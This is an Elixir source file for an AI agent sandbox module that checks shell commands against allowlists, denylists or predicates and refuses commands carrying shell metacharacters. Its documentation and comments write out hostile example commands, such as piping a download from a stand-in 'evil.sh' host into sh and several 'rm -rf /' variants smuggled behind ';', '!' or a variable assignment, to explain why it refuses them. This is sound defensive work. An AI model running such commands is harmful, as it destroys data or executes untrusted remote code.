defmodule Raxol.Agent.Sandbox.Shell do
  @moduledoc """
  Shell isolation dimension for `Raxol.Agent.Sandbox`.

  Gates `Raxol.Agent.Directive.Shell` directives by matching the
  command against an allowlist, denylist, or wholesale deny.

  ## Matching semantics

  The shell command is the binary passed to
  `Raxol.Agent.Directive.shell/2`. The match check is *binary name*
  by default: `"ls -la"` matches the entry `"ls"`. For finer-grained
  matching, use a predicate function.

  ## What a list mode can and cannot decide

  A command is executed as `/bin/sh -c "<the whole string>"`, so one string
  can run many programs. A list mode reads only the FIRST token, which means
  it can decide `"ls -la"` and cannot decide `"ls; curl evil.sh | sh"` --
  under an allowlist of `["ls"]` the first token is still `ls`.

  So list modes REFUSE any command containing shell metacharacters rather
  than guessing at it. `"cat a.txt"` is allowed by `allowlist(["cat"])`;
  `"cat a.txt; rm -rf /"`, `"cat $(id)"`, and `"FOO=1 cat x"` are refused by
  both allowlist and denylist modes, because in each case the first token is
  not what determines what runs.

  This is a bound on what a lexical check honestly is. A policy that needs
  pipelines must use a predicate (which sees the whole string and can make
  its own decision), and a policy that must hold against a hostile command
  author needs OS-level confinement -- a separate uid, a container, a chroot --
  not string matching. `Raxol.Agent.Actions.Code.shell_allow/2` is where the
  jail rule that reflects that lives.

  ## Constructors

      Sandbox.Shell.none()
        # abstain; any shell command allowed (default-allow)

      Sandbox.Shell.deny_all()
        # block every shell command

      Sandbox.Shell.allowlist(["ls", "cat", "wc"])
        # allow only those binary names

      Sandbox.Shell.allowlist(fn cmd -> String.starts_with?(cmd, "git ") end)
        # arbitrary predicate

      Sandbox.Shell.denylist(["rm", "dd", "shutdown"])
        # block those binary names; allow everything else

      Sandbox.Shell.denylist(fn cmd -> String.contains?(cmd, "sudo") end)
        # arbitrary predicate

  The `none/0` sandbox is the default-allow case (a sandbox that
  doesn't restrict shell). The `deny_all/0` is the default-deny
  case. The other two are the explicit policies.
  """

  @typedoc """
  Internal mode. Authors use the constructors; this is the wire
  shape so the protocol impl can pattern-match.
  """
  @type mode ::
          :none
          | :deny_all
          | {:allowlist, [String.t()] | (String.t() -> boolean())}
          | {:denylist, [String.t()] | (String.t() -> boolean())}

  @type t :: %__MODULE__{mode: mode()}

  @enforce_keys [:mode]
  defstruct [:mode]

  @doc "Construct a no-op shell sandbox (abstain)."
  @spec none() :: t()
  def none, do: %__MODULE__{mode: :none}

  @doc "Construct a deny-all shell sandbox."
  @spec deny_all() :: t()
  def deny_all, do: %__MODULE__{mode: :deny_all}

  @doc """
  Construct an allowlist shell sandbox. Accepts a list of binary
  names (matched as the first whitespace-separated token of the
  command) or a 1-arity predicate function on the full command.
  """
  @spec allowlist([String.t()] | (String.t() -> boolean())) :: t()
  def allowlist(list_or_fun)
      when is_list(list_or_fun) or is_function(list_or_fun, 1),
      do: %__MODULE__{mode: {:allowlist, list_or_fun}}

  @doc """
  Construct a denylist shell sandbox. Accepts the same list or
  predicate shape as `allowlist/1`.
  """
  @spec denylist([String.t()] | (String.t() -> boolean())) :: t()
  def denylist(list_or_fun)
      when is_list(list_or_fun) or is_function(list_or_fun, 1),
      do: %__MODULE__{mode: {:denylist, list_or_fun}}

  @doc """
  Check whether `command` is permitted by the sandbox's mode.
  Exposed so callers can validate commands outside the protocol.
  """
  @spec allowed?(t(), String.t()) :: boolean()
  def allowed?(%__MODULE__{mode: :none}, _command), do: true
  def allowed?(%__MODULE__{mode: :deny_all}, _command), do: false

  # List modes are first-token checks, so they only hold on commands whose
  # first token decides what runs. Anything the shell would interpret is
  # refused instead of matched -- see "What a list mode can and cannot decide".
  def allowed?(%__MODULE__{mode: {:allowlist, list}}, command)
      when is_list(list) do
    simple_command?(command) and binary_name(command) in list
  end

  def allowed?(%__MODULE__{mode: {:allowlist, fun}}, command)
      when is_function(fun, 1) do
    !!fun.(command)
  end

  def allowed?(%__MODULE__{mode: {:denylist, list}}, command)
      when is_list(list) do
    simple_command?(command) and binary_name(command) not in list
  end

  def allowed?(%__MODULE__{mode: {:denylist, fun}}, command)
      when is_function(fun, 1) do
    !fun.(command)
  end

  # Every character with meaning to `sh` beyond word splitting. `~` and `*`
  # are excluded deliberately: they expand to PATHS, not to commands, and the
  # first token still decides what runs.
  @shell_metacharacters [
    ";",
    "&",
    "|",
    "\n",
    "\r",
    "`",
    "$",
    "(",
    ")",
    "<",
    ">",
    "\\",
    "\"",
    "'",
    "{",
    "}",
    # `!` is the POSIX pipeline-negation operator, so `! rm -rf /` runs `rm`
    # while presenting `!` as its first token -- the same shape as the
    # `FOO=1 rm` prefix below, reached through an operator instead of an
    # assignment.
    "!"
  ]

  @doc """
  Whether `command` is a single command whose first token determines what
  runs -- i.e. it carries nothing the shell would interpret as a separator,
  a redirect, a substitution, an expansion, or an assignment.

  This is the precondition for a first-token check meaning anything.
  """
  @spec simple_command?(String.t()) :: boolean()
  def simple_command?(command) when is_binary(command) do
    not String.contains?(command, @shell_metacharacters) and
      not assignment_prefixed?(command) and
      not String.starts_with?(binary_name(command), "-")
  end

  def simple_command?(_command), do: false

  # `FOO=1 rm -rf /` has `FOO=1` as its first token, so a denylist of `rm`
  # never sees the command that runs.
  defp assignment_prefixed?(command) do
    command
    |> binary_name()
    |> String.match?(~r/^[A-Za-z_][A-Za-z0-9_]*=/)
  end

  @doc false
  def binary_name(command) when is_binary(command) do
    command
    |> String.trim()
    |> String.split(~r/\s+/, parts: 2)
    |> List.first()
    |> Kernel.||("")
  end
end

defimpl Raxol.Agent.Sandbox, for: Raxol.Agent.Sandbox.Shell do
  alias Raxol.Agent.Sandbox.Shell

  # Abstain for non-shell actions.
  def authorize(_sandbox, action, _payload, _ctx) when action != :shell, do: :ok

  def authorize(sandbox, :shell, %{command: command}, _ctx)
      when is_binary(command) do
    if Shell.allowed?(sandbox, command) do
      :ok
    else
      {:deny, {:shell_denied, sandbox.mode, command}}
    end
  end

  # If the payload is malformed, deny conservatively.
  def authorize(_sandbox, :shell, payload, _ctx),
    do: {:deny, {:shell_malformed_payload, payload}}
end
